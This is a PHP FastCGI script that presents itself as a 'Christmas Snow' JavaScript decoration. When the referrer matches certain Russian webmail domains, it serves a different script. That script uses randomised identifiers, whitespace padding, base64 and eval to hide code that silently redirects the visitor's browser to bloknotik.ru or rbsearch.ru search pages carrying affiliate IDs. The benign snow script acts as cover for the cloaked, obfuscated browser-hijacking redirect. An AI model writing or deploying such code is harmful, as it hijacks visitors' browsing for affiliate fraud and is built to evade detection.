#!/usr/local/bin/php
<?php
set_time_limit(0);
ob_implicit_flush();

include '/sites/lib/fcgi/fcgi_h.php';

///////




function header_200(){
	return "Status: 200\r\nContent-Type: text/plain\r\n\r\n";
}
function header_404(){
	return "Status: 404\r\nContent-Type: text/plain\r\n\r\n";
}


if(!function_exists('myrandom')){
function myrandom($n = 8, $_c = ''){
	if(empty($_c))
		$_c = '0123456789';
	
	$_s = '';
	for($i=0; $i<$n; $i++)
		$_s .= $_c[ rand(0,strlen($_c)-1) ];
	
	return $_s;
}}

if(!function_exists('randword_')){
function randword_(){
	
	$w = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
	
	$we = $w.'0123456789_';
	
	return myrandom(1, $w) . myrandom(rand(1,20), $we);
}}

if(!function_exists('rs_')){
function rs_(){
	
	$w = "\r\n\t ";
	
	return myrandom(rand(0,20), $w);
}}


function test($R){
	fcgi_assign_globals($R, $a_get = true, $a_post = false, $a_mpost = false, $upload_files = false , $a_sess = false);
	$P = &$R->params;
	$D = &$R->data;
	
/*	echo header_200();
//	echo "\r\n";
	
	echo "\r\n _GET VARS: \r\n"; print_r($_GET);
	echo "\r\n _POST VARS: \r\n"; print_r($_POST);
	echo "\r\n _FILES VARS: \r\n"; print_r($_FILES);
	
	
	$_SESSION['test'] = 'TEST !!! TEST !!! TEST !!! TEST !!! TEST !!! TEST !!!';
	
	ob_start();
	
	echo header_200();
	
	echo "POST DATA:\r\n", $D, "\r\n";
	
	echo "REQUEST PARAMS:\r\n";
	
	print_r($P);
	*/
	
	ob_start();
	echo "Content-Type: application/x-javascript\r\n\r\n";
//////////////////////////////////////////////////////////
$title = join(' ',
	preg_split('/[^\w\dà-ÿÀ-ß¸¨\._-]/ms',
		@pack('H*',@$_REQUEST['title']), -1, PREG_SPLIT_NO_EMPTY
	)
);


$_t = parse_url(@$_SERVER['HTTP_REFERER']);
if(!preg_match('/\.(hut1|h15|newmail|nm|hotmail|nightmail)\.ru$/Ui', @$_t['host']))
	$_REQUEST['se'] = 'pizdezh';


switch(@$_REQUEST['se']){
case 'no':
	
	$codelock_bas = randword_();
	$codelock_dec = randword_();
	$str = randword_();
	$bt = randword_();
	$dt = randword_();
	$i = randword_();
	
?>

<? ob_start(); ?>
var <?=$codelock_bas?>='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

function <?=$codelock_dec?>(<?=$str?>) {
	
	<?=$str?>=<?=$str?>.split('@').join('CAg');
	<?=$str?>=<?=$str?>.split('!').join('W5');
	<?=$str?>=<?=$str?>.split('*').join('CAgI');
	
	var <?=$bt?>, <?=$dt?> = '';
	
	for(<?=$i?>=0; <?=$i?><<?=$str?>.length; <?=$i?> += 4) {
		
		<?=$bt?> = (<?=$codelock_bas?>.indexOf(<?=$str?>.charAt(<?=$i?>)) & 0xff) <<18
			| (<?=$codelock_bas?>.indexOf(<?=$str?>.charAt(<?=$i?> +1)) & 0xff) <<12
			| (<?=$codelock_bas?>.indexOf(<?=$str?>.charAt(<?=$i?> +2)) & 0xff) << 6
			| <?=$codelock_bas?>.indexOf(<?=$str?>.charAt(<?=$i?> +3)) & 0xff;
		
		<?=$dt?> += String.fromCharCode((<?=$bt?> & 0xff0000) >>16, (<?=$bt?> & 0xff00) >>8, <?=$bt?> & 0xff);
		
	}
	
	if(<?=$str?>.charCodeAt(<?=$i?> -2) == 61) { return(<?=$dt?>.substring(0, <?=$dt?>.length -2)); }
	else if(<?=$str?>.charCodeAt(<?=$i?> -1) == 61) { return(<?=$dt?>.substring(0, <?=$dt?>.length -1)); }
	else {return(<?=$dt?>)};
	
}
<? $script = ob_get_clean(); ?>

eval(unescape('<?=rawurlencode($script)?>'));

eval(<?=$codelock_dec?>('<?=base64_encode( true
	? rs_().'window'.rs_().'.'.rs_().'location'.rs_().'='.rs_()
		.'"http://bloknotik.ru/index.php?action=search&search_query='.urlencode(@$title).'&misc=1226"'
		.rs_().';'.rs_()
	: rs_().'window'.rs_().'.'.rs_().'location'.rs_().'='.rs_()
		.'"http://www.rbsearch.ru/search.php?qq='.urlencode(@$title).'&said=958"'
	//	.'"http://putana.nu/index.php?partner=989"'
		.rs_().';'.rs_()
)?>'));

<?
	
break;
default:
	
	?>

// Christmas Snow © 2002-2004 by Filosoff

// Set the number of snowflakes (more than 40 not recommended)
var snowmax=36

// Set the colors for the snow. Add as many colors as you like
var snowcolor=new Array("#FFFFFF","#FBFBFB","#F6F6F6")

// Set the fonts, that create the snowflakes. Add as many fonts as you like
var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS", "Verdana")

// Set the letter that creates your snowflake (recommended:*)
var snowletter="*"

// Set the speed of sinking (recommended values range from 0.3 to 2)
var sinkspeed=0.7

// Set the maximal-size of your snowflaxes
var snowmaxsize=20

// Set the minimal-size of your snowflaxes
var snowminsize=12

// Set the snowing-zone
// Set 1 for all-over-snowing, set 2 for left-side-snowing
// Set 3 for center-snowing, set 4 for right-side-snowing
var snowingzone=3

///////////////////////////////////////////////////////////////////////////
// CONFIGURATION ENDS HERE
///////////////////////////////////////////////////////////////////////////


// Do not edit below this line
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)
var browserok=ie5||ns6||opera

function randommaker(range) {
rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
if (ie5 || opera) {
  marginbottom = document.body.clientHeight
  marginright = document.body.clientWidth
}
else if (ns6) {
  marginbottom = window.innerHeight
  marginright = window.innerWidth
}
var snowsizerange=snowmaxsize-snowminsize
for (i=0;i<=snowmax;i++) {
  crds[i] = 0;
     lftrght[i] = Math.random()*15;
     x_mv[i] = 0.03 + Math.random()/10;
  snow[i]=document.getElementById("s"+i)
  snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
  snow[i].size=randommaker(snowsizerange)+snowminsize
  snow[i].style.fontSize=snow[i].size
  snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
  snow[i].sink=sinkspeed*snow[i].size/5
  if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size-1)}
  if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
  if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
  if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
  snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
  snow[i].style.left=snow[i].posx
  snow[i].style.top=snow[i].posy
}
movesnow()
}

function movesnow() {
for (i=0;i<=snowmax;i++) {
  crds[i] += x_mv[i];
  snow[i].posy+=snow[i].sink
  snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
  snow[i].style.top=snow[i].posy

  if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
   if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size-1)}
   if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
   if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
   if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
   snow[i].posy=0
  }
}
var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
document.write("<span id=\'s"+i+"\' style=\'position:absolute;top:-"+snowmaxsize+"\'>"+snowletter+"</span>")
}
if (browserok) {
window.onload=initsnow
}

<?
	
}
//////////////////////////////////////////////////////////
	return ob_get_clean();
}

///////

$s = new fcgi_server('test', '/tmp/test.sock', 0, AF_UNIX, SOCK_STREAM, 0);
if($s->ready) $s->run();

?>